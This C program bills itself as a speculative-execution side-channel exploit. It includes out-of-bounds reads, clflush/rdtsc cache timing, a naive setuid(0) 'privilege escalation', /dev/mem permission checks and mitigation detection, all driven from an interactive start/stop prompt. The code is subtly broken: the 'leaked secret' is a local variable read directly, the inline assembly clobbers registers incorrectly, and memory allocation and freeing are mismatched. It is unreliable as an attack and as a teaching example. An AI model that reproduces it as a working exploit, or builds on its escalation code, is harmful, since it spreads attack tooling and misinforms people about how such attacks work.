#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/times.h>
#include <sys/vtimes.h>
#include <stdint.h>
#include <signal.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <sys/sysinfo.h>
#include <pwd.h>

#define MEM_SIZE_DEFAULT 4096
#define CACHE_HIT_THRESHOLD_DEFAULT 80
#define NUM_THREADS_DEFAULT 4
#define MAX_LOG_ENTRY 256

void* memory;
volatile int running = 1;
char secret_data = 'S';  // Hypothetical secret data
pthread_mutex_t log_mutex = PTHREAD_MUTEX_INITIALIZER;
FILE* log_file;

int CACHE_HIT_THRESHOLD = CACHE_HIT_THRESHOLD_DEFAULT;
int NUM_THREADS = NUM_THREADS_DEFAULT;
int MEM_SIZE = MEM_SIZE_DEFAULT;

// Memory management functions
void allocate_memory();
void deallocate_memory();
void flush_cache(void* addr);
uint64_t measure_access_time(void* addr);

// Speculative execution and side-channel functions
void* trigger_speculative_execution(void* arg);
void start_speculative_execution_exploit();
void stop_speculative_execution_exploit();

// Utility functions
void log_message(const char* message, const char* severity);
void setup_signal_handling();
void handle_signal(int signal);
void setup_logging();
void cleanup();
void interactive_mode();
int get_cpu_usage();
void log_statistics();
void configure_from_file(const char* filename);
void show_help();
void manage_resources();
void limit_threads();
void check_system_capabilities();
void adapt_to_environment();
void check_permissions();
void detect_hardware_mitigations();
void log_system_load();
void adjust_for_system_load();
void escalate_privileges();
void drop_privileges();

// Memory management implementation
void allocate_memory() {
    for (int attempt = 0; attempt < 3; ++attempt) {
        memory = mmap(NULL, MEM_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (memory != MAP_FAILED) {
            return;
        }
        log_message("Memory allocation with mmap failed. Retrying.", "WARNING");
        usleep(100000); // Wait 100ms before retrying
    }

    log_message("Memory allocation with mmap failed after retries. Falling back to malloc.", "WARNING");
    for (int attempt = 0; attempt < 3; ++attempt) {
        memory = malloc(MEM_SIZE);
        if (memory) {
            return;
        }
        log_message("Memory allocation with malloc failed. Retrying.", "ERROR");
        perror("malloc");
        usleep(100000); // Wait 100ms before retrying
    }

    log_message("Memory allocation with malloc failed after retries. Exiting.", "CRITICAL");
    exit(EXIT_FAILURE);
}

void deallocate_memory() {
    if (memory) {
        if (munmap(memory, MEM_SIZE) != 0) {
            log_message("Memory deallocation with munmap failed. Retrying with free.", "WARNING");
            for (int attempt = 0; attempt < 3; ++attempt) {
                free(memory);
                memory = NULL;
                return;
            }
        }
    }
}

// Cache management implementation
void flush_cache(void* addr) {
    asm volatile("clflush (%0)" : : "r"(addr) : "memory");
    volatile char* dummy = (char*)malloc(MEM_SIZE);
    if (dummy) {
        for (size_t i = 0; i < MEM_SIZE; i += 64) {
            dummy[i] = 0;
        }
        free((void*)dummy);
    } else {
        log_message("Failed to allocate memory for cache flush fallback.", "ERROR");
    }
}

uint64_t measure_access_time(void* addr) {
    uint64_t start, end, elapsed;
    asm volatile (
        "mfence\n"
        "lfence\n"
        "rdtsc\n"
        "lfence\n"
        "mov %%rax, %0\n"
        "mov (%1), %%rax\n"
        "lfence\n"
        "rdtsc\n"
        "lfence\n"
        "mov %%rax, %1\n"
        : "=r" (start), "=r" (end)
        : "1" (addr)
        : "rax", "rbx", "rcx", "rdx", "memory"
    );
    elapsed = end - start;

    struct timespec ts_start, ts_end;
    clock_gettime(CLOCK_MONOTONIC, &ts_start);
    (void)*(volatile char*)addr;
    clock_gettime(CLOCK_MONOTONIC, &ts_end);

    uint64_t ns_elapsed = (ts_end.tv_sec - ts_start.tv_sec) * 1000000000ULL + (ts_end.tv_nsec - ts_start.tv_nsec);
    return (elapsed + ns_elapsed) / 2;
}

// Speculative execution implementation
void* trigger_speculative_execution(void* arg) {
    while (running) {
        for (int attempt = 0; attempt < 3; ++attempt) {
            volatile char* ptr1 = (char*)memory + MEM_SIZE + 1; // Out-of-bounds access
            volatile char* ptr2 = (char*)memory + (MEM_SIZE / 2); // Boundary access
            char temp1 = *ptr1; // Trigger speculative execution with out-of-bounds
            char temp2 = *ptr2; // Trigger speculative execution with boundary access
            (void)temp1; // Suppress unused variable warning
            (void)temp2; // Suppress unused variable warning

            flush_cache(&secret_data);
            uint64_t time1 = measure_access_time(&secret_data);
            flush_cache(&secret_data);
            uint64_t time2 = measure_access_time(&secret_data);
            uint64_t avg_time = (time1 + time2) / 2;

            if (avg_time < CACHE_HIT_THRESHOLD) {
                char log_entry[MAX_LOG_ENTRY];
                snprintf(log_entry, sizeof(log_entry), "Leaked secret data: %c, avg access time: %lu", secret_data, avg_time);
                log_message(log_entry, "INFO");
                break;
            }
            usleep(5000); // Delay between retries
        }
        memset(memory, 0, MEM_SIZE);
        usleep(5000);
    }
    return NULL;
}

void start_speculative_execution_exploit() {
    pthread_t threads[NUM_THREADS];
    int actual_threads = NUM_THREADS;

    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, trigger_speculative_execution, NULL) != 0) {
            log_message("Thread creation failed. Reducing thread count and retrying.", "WARNING");
            actual_threads = i;
            break;
        }
    }

    for (int i = 0; i < actual_threads; i++) {
        for (int attempt = 0; attempt < 3; ++attempt) {
            if (pthread_join(threads[i], NULL) == 0) {
                break;
            }
            log_message("Thread joining failed. Retrying.", "WARNING");
            usleep(5000); // Delay between retries
        }
    }
}

void stop_speculative_execution_exploit() {
    running = 0;
    log_message("Speculative execution exploit stopped.", "INFO");
}

// Utility functions implementation
void log_message(const char* message, const char* severity) {
    pthread_mutex_lock(&log_mutex);
    if (log_file) {
        time_t now = time(NULL);
        char* timestr = ctime(&now);
        timestr[strlen(timestr) - 1] = '\0';
        fprintf(log_file, "[%s] %s: %s\n", timestr, severity, message);
        fflush(log_file);
    }
    pthread_mutex_unlock(&log_mutex);
}

void setup_signal_handling() {
    struct sigaction sa;
    sa.sa_handler = handle_signal;
    sa.sa_flags = 0;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGINT, &sa, NULL) == -1 || sigaction(SIGTERM, &sa, NULL) == -1 || sigaction(SIGHUP, &sa, NULL) == -1) {
        log_message("Setting up signal handling with sigaction failed. Falling back to signal.", "WARNING");
        if (signal(SIGINT, handle_signal) == SIG_ERR || signal(SIGTERM, handle_signal) == SIG_ERR || signal(SIGHUP, handle_signal) == SIG_ERR) {
            log_message("Setting up signal handling with signal failed.", "ERROR");
            perror("signal");
            // Exit or handle appropriately if no other option is feasible
        }
    }
}

void handle_signal(int signal) {
    running = 0;
    char log_entry[MAX_LOG_ENTRY];
    snprintf(log_entry, sizeof(log_entry), "Caught signal %d, shutting down gracefully.", signal);
    log_message(log_entry, "INFO");
}

void setup_logging() {
    log_file = fopen("speculative_execution_log.txt", "a");
    if (!log_file) {
        log_message("Opening log file failed. Falling back to standard output.", "WARNING");
        log_file = stdout;
    }
    manage_resources();
}

void cleanup() {
    if (log_file && log_file != stdout) {
        fclose(log_file);
    }
    deallocate_memory();
}

void interactive_mode() {
    char command[100];
    while (running) {
        printf("Enter command (start/stop/exit/help): ");
        fgets(command, sizeof(command), stdin);
        if (strncmp(command, "start", 5) == 0) {
            start_speculative_execution_exploit();
        } else if (strncmp(command, "stop", 4) == 0) {
            stop_speculative_execution_exploit();
        } else if (strncmp(command, "exit", 4) == 0) {
            running = 0;
        } else if (strncmp(command, "help", 4) == 0) {
            show_help();
        } else {
            printf("Unknown command.\n");
        }
    }
}

void show_help() {
    printf("Available commands:\n");
    printf("  start  - Start the speculative execution exploit.\n");
    printf("  stop   - Stop the speculative execution exploit.\n");
    printf("  exit   - Exit the program.\n");
    printf("  help   - Show this help message.\n");
}

int get_cpu_usage() {
    static clock_t last_cpu = 0;
    static clock_t last_sys_cpu = 0;
    static clock_t last_user_cpu = 0;
    static int num_processors = -1;

    struct tms time_sample;
    clock_t now;

    if (num_processors == -1) {
        num_processors = sysconf(_SC_NPROCESSORS_ONLN);
    }

    now = times(&time_sample);
    if (now <= last_cpu || time_sample.tms_stime < last_sys_cpu || time_sample.tms_utime < last_user_cpu) {
        return -1;
    } else {
        int percent = (time_sample.tms_stime - last_sys_cpu) + (time_sample.tms_utime - last_user_cpu);
        percent = percent * 100 / (now - last_cpu) / num_processors;
        last_cpu = now;
        last_sys_cpu = time_sample.tms_stime;
        last_user_cpu = time_sample.tms_utime;
        return percent;
    }
}

void log_statistics() {
    char log_entry[MAX_LOG_ENTRY];
    snprintf(log_entry, sizeof(log_entry), "CPU Usage: %d%%", get_cpu_usage());
    log_message(log_entry, "STATS");
}

void configure_from_file(const char* filename) {
    FILE* config_file = fopen(filename, "r");
    if (!config_file) {
        log_message("Opening configuration file failed. Using default configuration.", "WARNING");
        CACHE_HIT_THRESHOLD = CACHE_HIT_THRESHOLD_DEFAULT;
        NUM_THREADS = NUM_THREADS_DEFAULT;
        return;
    }

    char line[256];
    while (fgets(line, sizeof(line), config_file)) {
        if (strncmp(line, "CACHE_HIT_THRESHOLD=", 20) == 0) {
            CACHE_HIT_THRESHOLD = atoi(line + 20);
            if (CACHE_HIT_THRESHOLD <= 0) CACHE_HIT_THRESHOLD = CACHE_HIT_THRESHOLD_DEFAULT;
        } else if (strncmp(line, "NUM_THREADS=", 12) == 0) {
            NUM_THREADS = atoi(line + 12);
            if (NUM_THREADS <= 0) NUM_THREADS = NUM_THREADS_DEFAULT;
        }
    }

    fclose(config_file);
}

void manage_resources() {
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        rl.rlim_cur = rl.rlim_max;
        setrlimit(RLIMIT_NOFILE, &rl);
    } else {
        log_message("Failed to increase file descriptor limit.", "WARNING");
    }
}

void limit_threads() {
    if (NUM_THREADS > sysconf(_SC_NPROCESSORS_ONLN)) {
        NUM_THREADS = sysconf(_SC_NPROCESSORS_ONLN);
        char log_entry[MAX_LOG_ENTRY];
        snprintf(log_entry, sizeof(log_entry), "Number of threads limited to %d", NUM_THREADS);
        log_message(log_entry, "INFO");
    }
}

void check_system_capabilities() {
    if (sysconf(_SC_PAGESIZE) < MEM_SIZE) {
        log_message("Page size is smaller than MEM_SIZE. Adjusting MEM_SIZE.", "WARNING");
        MEM_SIZE = sysconf(_SC_PAGESIZE);
    }

    if (sysconf(_SC_NPROCESSORS_ONLN) < 1) {
        log_message("Failed to determine the number of processors. Assuming single processor.", "WARNING");
        NUM_THREADS = 1;
    }
}

void adapt_to_environment() {
    if (access("/proc/cpuinfo", F_OK) != -1) {
        log_message("Running on a Linux environment with /proc/cpuinfo available.", "INFO");
    } else {
        log_message("Non-Linux environment detected or /proc/cpuinfo not available.", "WARNING");
        // Adjust behavior based on environment specifics
    }
}

void check_permissions() {
    if (geteuid() != 0) {
        log_message("Program not running as root. Certain operations may be restricted.", "WARNING");
    }

    if (access("/dev/mem", R_OK | W_OK) == -1) {
        log_message("Insufficient permissions to access /dev/mem. Some functionalities may be limited.", "ERROR");
    }
}

void detect_hardware_mitigations() {
    log_message("Checking for hardware mitigations against speculative execution.", "INFO");

    FILE *cpuinfo = fopen("/proc/cpuinfo", "r");
    if (cpuinfo) {
        char line[256];
        while (fgets(line, sizeof(line), cpuinfo)) {
            if (strstr(line, "spec_ctrl")) {
                log_message("Speculative execution mitigation 'spec_ctrl' detected.", "INFO");
            }
            if (strstr(line, "ibrs")) {
                log_message("Indirect Branch Restricted Speculation (IBRS) detected.", "INFO");
            }
        }
        fclose(cpuinfo);
    } else {
        log_message("Failed to open /proc/cpuinfo. Cannot detect hardware mitigations.", "WARNING");
    }
}

void log_system_load() {
    struct sysinfo info;
    if (sysinfo(&info) == 0) {
        char log_entry[MAX_LOG_ENTRY];
        snprintf(log_entry, sizeof(log_entry), "System load: %ld, Free RAM: %ld", info.loads[0], info.freeram);
        log_message(log_entry, "INFO");
    } else {
        log_message("Failed to get system load information.", "WARNING");
    }
}

void adjust_for_system_load() {
    struct sysinfo info;
    if (sysinfo(&info) == 0 && info.loads[0] > 0) {
        usleep(10000); // Increase sleep time if system is under heavy load
    }
}

// Privilege escalation implementation
void escalate_privileges() {
    if (geteuid() != 0) {
        log_message("Attempting to escalate privileges.", "INFO");
        if (setuid(0) != 0) {
            log_message("Privilege escalation failed. Running with limited privileges.", "ERROR");
            perror("setuid");
        } else {
            log_message("Privilege escalation successful.", "INFO");
        }
    }
}

// Drop privileges after critical operations
void drop_privileges() {
    struct passwd* pw;
    uid_t uid;
    gid_t gid;

    pw = getpwnam("nobody");
    if (pw) {
        uid = pw->pw_uid;
        gid = pw->pw_gid;
        if (setgid(gid) != 0 || setuid(uid) != 0) {
            log_message("Dropping privileges failed.", "ERROR");
            perror("setgid/setuid");
        } else {
            log_message("Privileges dropped successfully. Running as nobody.", "INFO");
        }
    } else {
        log_message("Failed to find user 'nobody'. Cannot drop privileges.", "ERROR");
    }
}

int main(int argc, char* argv[]) {
    setup_signal_handling();
    setup_logging();
    check_permissions();
    allocate_memory();

    if (argc > 1) {
        configure_from_file(argv[1]);
    }

    escalate_privileges();
    adapt_to_environment();
    check_system_capabilities();
    limit_threads();
    detect_hardware_mitigations();

    printf("Starting speculative execution exploit. Press Ctrl+C to stop.\n");
    interactive_mode();

    while (running) {
        log_system_load();
        adjust_for_system_load();
    }

    drop_privileges();
    cleanup();
    return 0;
}
